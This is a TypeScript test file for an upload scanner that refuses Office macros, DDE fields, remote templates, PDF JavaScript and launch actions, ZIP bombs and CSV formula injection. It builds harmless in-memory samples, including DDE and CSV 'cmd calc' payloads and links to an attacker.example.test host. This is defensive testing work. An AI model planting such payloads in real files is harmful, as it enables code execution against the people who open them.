import { deflateRawSync, deflateSync } from "node:zlib";
import { describe, expect, it } from "vitest";
import { activeContent } from "@/server/scan";
import { checkFile } from "@/server/ws/files";

/* SEC-18 phase A: active content is refused before a file is stored. Every sample is built here, in memory; none is real malware (EICAR is
   the industry's harmless test string). */
const enc = (s: string) => new TextEncoder().encode(s);

/** A minimal ZIP writer (stored or deflated entries; CRCs are not checked by the scanner, so they are left 0). */
function zip(files: Record<string, string | Uint8Array>, opts: { deflate?: boolean; fakeSize?: Record<string, number> } = {}): Uint8Array {
  const locals: Buffer[] = []; const central: Buffer[] = []; let offset = 0;
  for (const [name, content] of Object.entries(files)) {
    const raw = typeof content === "string" ? enc(content) : content;
    const data = opts.deflate ? deflateRawSync(raw) : Buffer.from(raw);
    const n = Buffer.from(name); const size = opts.fakeSize?.[name] ?? raw.length;
    const lh = Buffer.alloc(30); lh.writeUInt32LE(0x04034b50, 0); lh.writeUInt16LE(20, 4); lh.writeUInt16LE(opts.deflate ? 8 : 0, 8);
    lh.writeUInt32LE(data.length, 18); lh.writeUInt32LE(size, 22); lh.writeUInt16LE(n.length, 26);
    const ch = Buffer.alloc(46); ch.writeUInt32LE(0x02014b50, 0); ch.writeUInt16LE(20, 4); ch.writeUInt16LE(20, 6); ch.writeUInt16LE(opts.deflate ? 8 : 0, 10);
    ch.writeUInt32LE(data.length, 20); ch.writeUInt32LE(size, 24); ch.writeUInt16LE(n.length, 28); ch.writeUInt32LE(offset, 42);
    locals.push(lh, n, data); central.push(ch, n); offset += 30 + n.length + data.length;
  }
  const cd = Buffer.concat(central); const end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50, 0); end.writeUInt16LE(central.length / 2, 8); end.writeUInt16LE(central.length / 2, 10);
  end.writeUInt32LE(cd.length, 12); end.writeUInt32LE(offset, 16);
  return new Uint8Array(Buffer.concat([...locals, cd, end]));
}
const TYPES = `<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>`;
const DOC = `<w:document><w:body><w:p><w:r><w:t>Access review, synthetic</w:t></w:r></w:p></w:body></w:document>`;
const HYPERLINK = `<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://example.test/policy" TargetMode="External"/></Relationships>`;
const docx = (extra: Record<string, string | Uint8Array> = {}, opts?: Parameters<typeof zip>[1]) =>
  zip({ "[Content_Types].xml": TYPES, "word/document.xml": DOC, "word/_rels/document.xml.rels": HYPERLINK, ...extra }, opts);

describe("SEC-18: Office documents", () => {
  it("a plain document with a web link is accepted, stored or compressed", () => {
    expect(activeContent("docx", docx())).toBeNull();
    expect(activeContent("docx", docx({}, { deflate: true }))).toBeNull();
    expect(activeContent("docx", docx({ "word/media/image1.png": "png-bytes" }))).toBeNull();
  });
  it("macros are refused, by part or by a macro-enabled content type", () => {
    expect(activeContent("docx", docx({ "word/vbaProject.bin": "x" }))).toBe("it contains macros");
    expect(activeContent("xlsx", zip({ "[Content_Types].xml": TYPES.replace("document.main", "sheet.macroEnabled.main"), "xl/workbook.xml": "<workbook/>" }))).toBe("it contains macros");
  });
  it("ActiveX controls, OLE objects and embedded executables are refused", () => {
    expect(activeContent("docx", docx({ "word/activeX/activeX1.xml": "<ax/>" }))).toBe("it contains ActiveX controls");
    expect(activeContent("docx", docx({ "word/embeddings/oleObject1.bin": "x" }))).toBe("it contains embedded OLE objects");
    expect(activeContent("docx", docx({ "word/embeddings/payload.exe": "MZ" }))).toMatch(/embedded file that is not a document/);
  });
  it("an embedded workbook (a chart's data) is checked the same way", () => {
    const clean = zip({ "[Content_Types].xml": TYPES, "xl/workbook.xml": "<workbook/>" });
    const bad = zip({ "[Content_Types].xml": TYPES, "xl/vbaProject.bin": "x" });
    expect(activeContent("docx", docx({ "word/embeddings/Microsoft_Excel_Worksheet1.xlsx": clean }))).toBeNull();
    expect(activeContent("docx", docx({ "word/embeddings/Microsoft_Excel_Worksheet1.xlsx": bad }))).toBe("it contains macros");
  });
  it("remote templates, external pictures and external workbook links are refused; hyperlinks are not", () => {
    const remote = `<Relationships><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://attacker.example.test/t.dotm" TargetMode="External"/></Relationships>`;
    expect(activeContent("docx", docx({ "word/_rels/settings.xml.rels": remote }))).toMatch(/loads content from outside/);
    const pic = HYPERLINK.replace("/hyperlink", "/image").replace("https://example.test/policy", "file://server.example.test/share/x.png");
    expect(activeContent("docx", docx({ "word/_rels/header1.xml.rels": pic }))).toMatch(/loads content from outside/);
  });
  it("DDE fields and DDE links are refused", () => {
    const dde = DOC.replace("<w:t>Access review, synthetic</w:t>", `<w:instrText xml:space="preserve"> DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc" </w:instrText>`);
    expect(activeContent("docx", docx({ "word/document.xml": dde }))).toBe("it contains a DDE field");
    expect(activeContent("docx", docx({ "word/document.xml": DOC.replace("<w:p>", `<w:fldSimple w:instr=" DDE cmd /c calc "/><w:p>`) }))).toBe("it contains a DDE field");
    expect(activeContent("xlsx", zip({ "[Content_Types].xml": TYPES, "xl/externalLinks/externalLink1.xml": `<externalLink><ddeLink ddeService="cmd" ddeTopic="/c calc"/></externalLink>` }))).toBe("it contains a DDE link");
  });
  it("ZIP bombs and broken containers are refused (fails closed)", () => {
    expect(activeContent("docx", docx({}, { fakeSize: { "word/document.xml": 80 * 1024 * 1024 } }))).toBe("it expands to an unsafe size");
    const bomb = docx({ "word/_rels/footer1.xml.rels": "<Relationships>" + " ".repeat(20 * 1024 * 1024) + "</Relationships>" }, { deflate: true });
    expect(bomb.length).toBeLessThan(EIGHTY_KB);
    expect(activeContent("docx", bomb)).toBe("it expands to an unsafe size");
    expect(activeContent("docx", zip({ "word/document.xml": DOC }))).toBe("it is not a complete Office document");
    expect(activeContent("docx", new Uint8Array([0x50, 0x4b, 0x03, 0x04, 1, 2, 3]))).toBe("it could not be checked completely");
  });
});
const EIGHTY_KB = 80 * 1024;

/** A small PDF: header, objects as given, and a trailer (cross-reference offsets are not needed by the scanner). */
const pdf = (...objects: (string | Uint8Array)[]) => {
  const parts = [enc("%PDF-1.7\n%\xe2\xe3\n"), ...objects.map((o, i) => (typeof o === "string" ? enc(`${i + 1} 0 obj\n${o}\nendobj\n`) : o)), enc("trailer\n<< /Root 1 0 R >>\n%%EOF\n")];
  return new Uint8Array(Buffer.concat(parts.map((p) => Buffer.from(p))));
};
const streamObj = (n: number, dict: string, data: Uint8Array) => new Uint8Array(Buffer.concat([Buffer.from(`${n} 0 obj\n<< ${dict} /Length ${data.length} >>\nstream\n`, "latin1"), Buffer.from(data), Buffer.from("\nendstream\nendobj\n")]));

describe("SEC-18: PDF", () => {
  it("a plain PDF with links and an open action (zoom) is accepted", () => {
    expect(activeContent("pdf", pdf("<< /Type /Catalog /Pages 2 0 R /OpenAction [3 0 R /Fit] >>", "<< /Type /Pages /Kids [] /Count 0 >>", "<< /Type /Annot /A << /S /URI /URI (https://example.test) >> >>"))).toBeNull();
  });
  it("JavaScript, launch actions, attached files, Flash and XFA are refused", () => {
    expect(activeContent("pdf", pdf("<< /Type /Catalog /OpenAction << /S /JavaScript /JS (app.alert(1)) >> >>"))).toBe("it contains JavaScript");
    expect(activeContent("pdf", pdf("<< /Type /Action /S /Launch /F (cmd.exe) >>"))).toBe("it can launch programs");
    expect(activeContent("pdf", pdf("<< /Type /Catalog /Names << /EmbeddedFiles 4 0 R >> >>"))).toBe("it has attached files");
    expect(activeContent("pdf", pdf("<< /Type /Annot /Subtype /RichMedia >>"))).toBe("it contains rich media (Flash)");
    expect(activeContent("pdf", pdf("<< /Type /Catalog /AcroForm << /XFA 5 0 R >> >>"))).toBe("it uses XFA forms");
  });
  it("names spelled with #xx escapes are decoded first", () => {
    expect(activeContent("pdf", pdf("<< /S /J#61vaScript /J#53 (x) >>"))).toBe("it contains JavaScript");
  });
  it("JavaScript hidden in a compressed object stream is found", () => {
    const inner = enc("4 0 << /S /JavaScript /JS (app.alert(1)) >>");
    expect(activeContent("pdf", pdf(streamObj(3, "/Type /ObjStm /N 1 /First 4 /Filter /FlateDecode", deflateSync(inner))))).toBe("it contains JavaScript");
    expect(activeContent("pdf", pdf(streamObj(3, "/Type /ObjStm /N 1 /First 4 /Filter /FlateDecode", deflateSync(enc("4 0 << /Type /Page >>")))))).toBeNull();
  });
  it("binary content that happens to contain the bytes /JS is not mistaken for JavaScript", () => {
    expect(activeContent("pdf", pdf(streamObj(3, "/Subtype /Image /Filter /DCTDecode", enc("\xff\xd8 /JS /Launch binary \x00\x01"))))).toBeNull();
  });
  it("what cannot be read is refused: encrypted object streams, unknown compression, hidden structure", () => {
    expect(activeContent("pdf", pdf("<< /Encrypt 9 0 R >>", streamObj(3, "/Type /ObjStm /Filter /FlateDecode", deflateSync(enc("x")))))).toMatch(/encrypted/);
    expect(activeContent("pdf", pdf(streamObj(3, "/Type /ObjStm /Filter /LZWDecode", enc("x"))))).toMatch(/compression that could not be checked/);
    expect(activeContent("pdf", pdf(streamObj(3, "/Type /Obj#53tm /Filter /FlateDecode", deflateSync(enc("x")))))).toMatch(/hides its structure/);
    expect(activeContent("pdf", pdf(streamObj(3, "/Type /ObjStm /Filter /FlateDecode", enc("not deflate data"))))).toBe("it could not be checked completely");
  });
});

describe("SEC-18: pictures, CSV and the EICAR test file", () => {
  const pngOf = (w: number, h: number) => { const b = Buffer.alloc(33); Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]).copy(b); b.writeUInt32BE(13, 8); b.write("IHDR", 12, "latin1"); b.writeUInt32BE(w, 16); b.writeUInt32BE(h, 20); return new Uint8Array(b); };
  const jpegOf = (w: number, h: number) => new Uint8Array([0xff, 0xd8, 0xff, 0xe0, 0, 4, 0, 0, 0xff, 0xc0, 0, 11, 8, h >> 8, h & 255, w >> 8, w & 255, 1, 1, 0x11, 0, 0xff, 0xd9]);
  it("pictures over 40 megapixels or 20,000 pixels on a side are refused", () => {
    expect(activeContent("png", pngOf(1920, 1080))).toBeNull();
    expect(activeContent("png", pngOf(30_000, 10))).toMatch(/too large/);
    expect(activeContent("png", pngOf(8_000, 8_000))).toMatch(/too large/);
    expect(activeContent("jpg", jpegOf(1920, 1080))).toBeNull();
    expect(activeContent("jpeg", jpegOf(10_000, 10_000))).toMatch(/too large/);
  });
  it("CSV cells a spreadsheet would run are refused; numbers and text are not", () => {
    expect(activeContent("csv", enc("control,owner,score\nIAM-1,Jordan,-5\nGOV-1,\"Priya, N\",+3\nnote,- bullet text,@\n".replace(",@", ",ok")))).toBeNull();
    expect(activeContent("csv", enc("a,b\n=cmd|' /C calc'!A0,x\n"))).toMatch(/formula/);
    expect(activeContent("csv", enc("a,b\nx,@SUM(1+1)*cmd|' /C calc'!A0\n"))).toMatch(/formula/);
    expect(activeContent("csv", enc("a,b\nx,+HYPERLINK(\"https://attacker.example.test\")\n"))).toMatch(/formula/);
    expect(activeContent("csv", enc("a;b\nx;-IMPORTXML(1)\n"))).toMatch(/formula/);
  });
  it("the EICAR test file is refused whatever its type", () => {
    const eicar = enc("X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*");
    expect(activeContent("txt", eicar)).toMatch(/EICAR/);
    expect(checkFile("eicar.txt", eicar)).toMatchObject({ threat: expect.stringMatching(/EICAR/), error: expect.stringMatching(/^This file was refused because it matches the EICAR/) });
  });
  it("checkFile passes clean files and keeps its earlier checks first", () => {
    expect(checkFile("review.docx", docx())).toMatchObject({ name: "review.docx", ext: "docx" });
    expect(checkFile("notes.txt", enc("Synthetic notes"))).toMatchObject({ ext: "txt" });
    expect(checkFile("macro.exe", docx())).toMatchObject({ error: expect.stringMatching(/not allowed/) });
    expect("threat" in checkFile("x.pdf", enc("not a pdf"))).toBe(false);
  });
});

/* Through the routes, as /api runs them: the evidence upload refuses active content with 422, records it in the company's audit log and as a
   security event, and stores nothing. (Trust Center and knowledge-base uploads use the same refuseFile; the vendor portal is covered in
   ws-group8b.test.ts.) */
describe("SEC-18: refusals through the evidence upload route", async () => {
  const { COOKIE, handle } = await import("@/server/core");
  const { MemoryAuth, MemoryStore } = await import("@/server/memory");
  const { MemoryDirectory } = await import("@/server/directory");
  const { MemoryPlatform } = await import("@/server/platform");
  const { MemorySupport } = await import("@/server/support");
  const { MemoryWsStore } = await import("@/server/ws/store");
  const { MemoryFileStore } = await import("@/server/ws/files");
  const { totpAt } = await import("@/lib/totp");
  const { vi } = await import("vitest");
  const ORIGIN = "https://app.example.test"; const PW = "Lantern-orbit-Quince-71"; const clock = 1_800_000_000_000;
  it("a macro document is refused, audited, logged and not stored; a clean one is stored", async () => {
    const auth = new MemoryAuth(() => clock); const store = new MemoryStore(() => clock); const dir = new MemoryDirectory(store);
    const plat = new MemoryPlatform(store, dir); const files = new MemoryFileStore();
    const d = { auth, store, dir, plat, sup: new MemorySupport(store, dir, plat), ws: new MemoryWsStore(store), files, site: { origin: ORIGIN, rpId: "app.example.test" }, secret: "x".repeat(40), now: () => clock };
    const acme = dir.addCompany("acme-eu", "Acme Test Co");
    const call = (method: string, path: string, body: Record<string, unknown> = {}, cookie?: string, raw?: Uint8Array) => handle(d, { method, path: path.split("/"), body, ip: "198.51.100.7", raw,
      cookies: cookie ? { [COOKIE]: cookie } : {}, headers: { origin: ORIGIN, "content-type": raw ? "application/octet-stream" : "application/json", "user-agent": "Mozilla/5.0 Chrome/140" } });
    const id = await auth.createUser("jordan@acme.example", PW, "Jordan Avery"); await auth.confirmUser(id);
    await store.insertProfile({ id, email: "jordan@acme.example", person: "Jordan Avery", status: "Active", requestedAt: clock }); dir.addMember(acme, id, "admin");
    const st = await call("POST", "auth/sign-in", { email: "jordan@acme.example", password: PW });
    const v = await call("POST", "auth/sign-in/verify", { ticket: (st.body as { ticket: string }).ticket, code: await totpAt(auth.secretOf("jordan@acme.example")!, clock) });
    const cookie = v.cookies![0].match(new RegExp(`${COOKIE}=([^;]*)`))![1];
    const ev = (await call("POST", "ws/evidence", { name: "Access review Q3", type: "Report", note: "Synthetic" }, cookie)).body as { id: string };
    const warn = vi.spyOn(console, "warn").mockImplementation(() => undefined);
    try {
      const bad = await call("POST", `ws/evidence/${ev.id}/files`, { name: "review.docx" }, cookie, docx({ "word/vbaProject.bin": "x" }));
      expect(bad.status).toBe(422); expect((bad.body as { error: string }).error).toMatch(/^This file was refused because it contains macros/);
      expect(store.auditLog.filter((x) => x.action === "file.refused").map((x) => x.target)).toEqual(["review.docx: it contains macros"]);
      const events = warn.mock.calls.map((c) => JSON.parse(String(c[0]))).filter((e) => e.event === "upload.refused");
      expect(events).toHaveLength(1); expect(events[0]).toMatchObject({ status: 422, route: "POST ws/evidence/:id/files", ip: "198.51.100.7" });
      expect(files.files.size).toBe(0);
      expect((await call("POST", `ws/evidence/${ev.id}/files`, { name: "review.docx" }, cookie, docx())).status).toBe(200);
      expect(files.files.size).toBe(1);
    } finally { warn.mockRestore(); }
  });
});
